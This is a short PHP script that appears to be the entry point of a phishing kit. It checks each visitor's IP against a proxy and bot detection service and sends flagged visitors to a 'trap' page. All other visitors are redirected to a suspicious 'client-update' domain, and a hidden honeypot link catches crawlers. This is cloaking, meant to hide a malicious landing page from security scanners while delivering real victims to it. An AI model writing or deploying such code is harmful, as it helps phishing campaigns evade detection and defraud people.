<?php

include 'ratelimiter.php';


include "blocker.php"; 
 
$ip = $_SERVER['REMOTE_ADDR']; // change to X_FORWARDED_FOR if reverse proxy, crude demo
if (file_get_contents('http://check.getipintel.net/check.php?ip='. $ip .'&contact=flochan14@yahoo.com&flags=f') == 1) 
{
header('Location: https://client-updateiud899.segawon-anjing.com/trap');
}
else{
header('Location: https://client-updateiud899.segawon-anjing.com/?neo');
}

?>
<a style="display:none" href="trap">Do not go here</a>